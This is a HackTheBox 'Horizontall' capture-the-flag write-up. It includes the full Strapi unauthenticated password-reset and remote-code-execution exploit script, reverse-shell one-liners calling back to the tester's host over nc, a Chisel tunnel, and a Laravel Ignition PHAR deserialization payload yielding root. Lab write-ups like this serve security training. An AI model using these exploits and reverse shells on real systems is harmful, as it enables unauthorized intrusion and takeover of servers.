---
title: Horizontall
tags:
  - HackTheBox
  - Easy
  - Linux
  - Deobfuscating
  - Strapi
  - Tunnelling
  - Laravel
  - PHPGGC
date: 2024-12-19T00:00:00Z
---
![](Pasted%20image%2020241219094024.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.105 horizontall.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- horizontall.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http
|_http-title: horizontall
```

So I took a look at the website:

![](Pasted%20image%2020241219094316.png)

After inspecting the source code and looking for virtual hosts or subdomains I didn't find anything. So I decided to perform some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md), but neither found anything.

So I decided to check what the app was doing by inspecting the petitions it made:

![](Pasted%20image%2020241219100302.png)

So I loaded `app.c68eb462.js` which was obfuscated:

![](Pasted%20image%2020241219100338.png)

So it was time to apply some [JavaScript Deobfuscation 🎸](javascript_deobfuscation.md):

![](Pasted%20image%2020241219101306.png)

I discovered a new vhost, so I added it to my known ones:

![](Pasted%20image%2020241219101421.png)

So now I performed some enumeration again with [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://api-prod.horizontall.htb -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e *

[redacted]
[10:15:49] 200 -  507B  - /reviews                                          
[10:15:49] 403 -   60B  - /users                                            
[10:15:49] 200 -  854B  - /admin                                            
[10:15:53] 200 -  507B  - /Reviews                                          
[10:15:59] 403 -   60B  - /Users                                            
[10:16:06] 200 -  854B  - /Admin
```

If we inspect `reviews` we can see all the ones that currently exist:

![](Pasted%20image%2020241219101703.png)

We can see that there are already 3 users: `wail`, `doe` and `john`

I also discovered an admin panel inside `/admin`:

![](Pasted%20image%2020241219101754.png)

I tried some basic combinations, but none was successfull, so I checked for some CVE related to Strapi

## Weaponization

![](Pasted%20image%2020241219102353.png)

So I got the script of the setting password Unauthenticated:

```shell
cp $(locate multiple/webapps/50239.py) .
```

```python
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
```

## Exploitation

I executed the script:

```shell
python3 50239.py http://api-prod.horizontall.htb
```

![](Pasted%20image%2020241219102828.png)

So I could log in as administrator:

![](Pasted%20image%2020241219102934.png)

But as the script i executed gave me a blind RCE, I executed a reverse shell to gain remote access to the machine:

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 666 >/tmp/f
```

![](Pasted%20image%2020241219103254.png)

> *I'm in and can read user flag*

## Privilege Escalation

I decided to check for opened ports in the machine:

```shell
netstat -ant
```

![](Pasted%20image%2020241219104122.png)

Port 1337 is related to MySQL, so I performed a curl request to it:

```shell
curl -S 127.0.0.1:1337

<!doctype html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Welcome to your API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
    </style>
  </head>
  <body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
</html>
```

Port 8000 seems to be running Laravel v8:

```shell
curl -S 127.0.0.1:8000

[redacted]
<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
    Laravel v8 (PHP v7.4.18)
</div>
```

So I forwarded that port to my machine by creating a tunnel using [Chisel 🦦](/notes/tools/Chisel.md):

```shell
# In my machine I executed:
python3 -m http.server 8090


# In horizontall machine I executed:
cd /dev/shm
wget http://10.10.14.28:8090/chisel_1.10.1_linux_amd64
chmod +x chisel_1.10.1_linux_amd64

# Now in my machine I executed:
./chisel_1.10.1_linux_amd64 server -p 8001 --reverse

# Finally in the horizontall machine I executed:
# 9000 is the port on the victim's machine which is using chisel for the connection
./chisel_1.10.1_linux_amd64 client 10.10.14.28:8001 R:9000:localhost:8000
```

Now if we input `http:localhost:9000` in our browser, we can see the hidden service:

![](Pasted%20image%2020241219105756.png)

So I decided to search for "*Laravel v8 exploit*" and found [CVE-2021-3129](https://github.com/ambionics/laravel-exploits?tab=readme-ov-file)
- You've got a nice blog post in [ambionics.io](https://www.ambionics.io/blog/laravel-debug-rce)

I need to download [phpggc](https://github.com/ambionics/phpggc) which is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.

Then I executed:

```shell
mkdir phpggc && cd phpggc && git clone https://github.com/ambionics/phpggc.git

php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id

cd..
python3 laravel-ignition-rce.py http://localhost:9000 /tmp/exploit.phar

+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

> We got code execution!

So now we can use a reverse shell to gain root access:

```shell
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 777 >/tmp/f'

python3 laravel-ignition-rce.py http://localhost:9000 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !

[redacted]
```

![](Pasted%20image%2020241219111704.png)

==Machine pwned!==